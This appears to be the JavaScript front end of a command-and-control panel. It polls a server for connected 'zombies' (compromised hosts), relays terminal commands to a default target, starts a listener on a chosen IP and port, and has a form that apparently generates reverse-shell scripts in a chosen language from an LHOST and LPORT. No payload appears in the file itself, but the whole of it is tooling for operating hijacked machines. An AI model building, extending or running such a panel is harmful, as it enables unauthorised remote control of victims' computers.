var last_text_server = "";
var last_text_create_script = "";
var last_text_terminal = "";

if (typeof localStorage.ls_terminal_output === 'undefined'){
    localStorage.ls_terminal_output = "";
}

if (typeof localStorage.ls_server_output === 'undefined'){
    localStorage.ls_server_output = "";
}

$(document).on('submit', "#server_conf_form",function( event ) {
    event.preventDefault();
});

$(document).on('submit', "#create_script_conf_form",function( event ) {
    event.preventDefault();
});

var page_path = window.location.pathname;
if (page_path === "/server") {
    getServerConf();
}
if (page_path === '/create_script') {
    getCreateScriptResp();
}
if (page_path === '/terminal') {
    getTerminalOutput();
}

if (page_path === '/zombies'){
    getZombiesList();
}

$(document).on("click", ".event_send_cmd", function( event ) {

    sendCommandToServer();

})

function sendCommandToServer(){

    var cmd = $('.command_input').val();
    if (cmd === '!clear'){
        clear_terminal();
    }
    var url_send_cmd = '/send_terminal_cmd';
    $.ajax({
    url: url_send_cmd,
    method: 'POST',
    data: {"cmd":cmd},
    success: function(r) {}
    })

    localStorage.ls_terminal_output += "<p>" + cmd + "</p>";

}

function getZombiesList(){
    setInterval(function (){
        var url_get_zombies = "/get_zombies";
        $.ajax({
            url: url_get_zombies,
            method: 'GET',
            success: function(r) {
                checkGetZombiesOutput(r);
            }
            })

    },500);

}

var zombies_text = ""; // store zombies text address and OS info
function checkGetZombiesOutput(resp){
    zombies_text = "";
    if (resp === 'Get Zombies Request Sent' || resp.length === 0){
        $('.get_zombies_response').html('There is No Connected Zombie!');
    } else {
        resp.forEach(iterateInZombiesArray);
        insertTextInZombiesPage();
    }

}

function iterateInZombiesArray(value, index, array){

    zombies_text += "<p>" + value[0] + value[1] + "</p>";

}

function insertTextInZombiesPage(){

    $('.get_zombies_response').html(zombies_text);

}

function getTerminalOutput(){

    var url_terminal = "/terminal_get_output";
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url_terminal, true);
    xhr.send();
    setInterval(function() {
        insertTextInTerminal(xhr.responseText);
        terminalGetDefaultTarget();
    }, 300);

}

function insertTextInTerminal(text){

    $('.terminal-body').html("<p>" + localStorage.ls_terminal_output + "</p>");
    if (last_text_terminal !== text) {
        temp_text = text.replace(last_text_terminal, ''); // set difference between text and last_text_terminal
        last_text_terminal = text;
        localStorage.ls_terminal_output = localStorage.ls_terminal_output + temp_text;
        $('.terminal-body').html("<p>" + localStorage.ls_terminal_output + "</p>");

        document.querySelector(".terminal-body").scrollTop =
            document.querySelector(".terminal-body").scrollHeight;

   }

}

function terminalGetDefaultTarget(){

    var url_get_default_target = "/terminal_get_default_target";
    $.ajax({
        url: url_get_default_target,
        method: 'GET',
        success: function(r) {
            terminalShowDefaultTarget(r);
        }
        })

}

function terminalShowDefaultTarget(dtarget){

    $('.terminal_get_default_target').html('Default Target --> ' + dtarget[0])

}

function setServerConnStatusOutput(resp){

    if (resp === 'Server Check Request Sent'){
        $('.show_server_status').html('Server LIP : None, Server LPort : None');
    } else {
        var lip = resp[0];
        var lport = resp[1];
        $('.show_server_status').html('Server LIP : ' + lip + ', Server LPort : ' + lport);
    }
}

function getServerConf(){
    // get server conf and put it in /server url bottom div

    $('.stop_server_event').removeAttr('disabled');

    var url = $("#server_conf_form").attr('action');

    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.send();
    setInterval(function() {
        insertTextServer(xhr.responseText);

        var url_check_server_conn = "/server_conf_check";
        $.ajax({
            url: url_check_server_conn,
            method: 'GET',
            success: function(r) {
                setServerConnStatusOutput(r);
            }
            })

    }, 300);

}

function insertTextServer(text) {

    $('.server_conf_response').html("<p>" + localStorage.ls_server_output + "</p>");
    if (last_text_server !== text) {
        temp_text = text.replace(last_text_server, ''); // set difference between text and last_text_server
        last_text_server = text;
        localStorage.ls_server_output = localStorage.ls_server_output + temp_text;
        $('.server_conf_response').html(localStorage.ls_server_output);
   }

}

$(document).on("click", ".clear_server_history", function( event ) {

    localStorage.removeItem("ls_server_output");
    localStorage.ls_server_output = "";

})

$(document).on("click", ".stop_server_event", function( event ) {

    var url = $("#server_conf_form").attr('action') + "_stop";
    var method = $("#server_conf_form").attr('method');

    $.ajax({
        url: url,
        method: method,
        data: {"stop_server":"True"},
        success: function(r) {
        }
        })

    })

$(document).on("click", ".clear_terminal_history", function ( event ) {

    clear_terminal();

    })

function clear_terminal(){

    localStorage.removeItem("ls_terminal_output");
    localStorage.ls_terminal_output = "";

}

$(document).on("click", ".start_server_event", function( event ) {

    var url = $("#server_conf_form").attr('action') + "_start";
    var method = $("#server_conf_form").attr('method');
    var lip = $("#lip").val();
    var lport = $("#lport").val();

    if (lip === "") {
        alert("Listening IP is required");
        return;
    }
    else if (lport === "") {
        alert("Listening port is required");
        return;
    }

    $.ajax({
        url: url,
        method: method,
        data: {"lip":lip ,"lport":lport},
        success: function(r, jqXHR, textStatus, errorThrown) {
        }
        })

    })

function insertTextInCS(text) {

    if (last_text_create_script !== text) {
        last_text_create_script = text;
        $('.server_create_script_response').html(last_text_create_script);
   }

}

function getCreateScriptResp(){
    // get create script resp and put it in /create_script url bottom div

    var url_cs = $("#create_script_conf_form").attr('action');
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url_cs, true);
    xhr.send();
    setInterval(function() {
        insertTextInCS(xhr.responseText);
    }, 1000);

}

$(document).on("click", ".event_create_script", function( event ) {

    var url_cs = $("#create_script_conf_form").attr('action') + "_create";
    var method_cs = $("#create_script_conf_form").attr('method');
    var localhost_createscript = $("#localhost_create_script").val();
    var localport_createscript = $("#localport_create_script").val();
    var lang_create_script = $('.create_script_lang').val();

    if (localhost_createscript === "") {
        alert("LHost is required");
        return;
    }
    else if (localport_createscript === "") {
        alert("LPort is required");
        return;
    }
    else if (lang_create_script === "") {
        alert("Language cannot be empty");
        return;
    }

    $.ajax({
        url: url_cs,
        method: method_cs,
        data: {"localhost":localhost_createscript ,
            "localport":localport_createscript ,
            "lang_create_script":lang_create_script},
        success: function(r) {
        }

    })

});
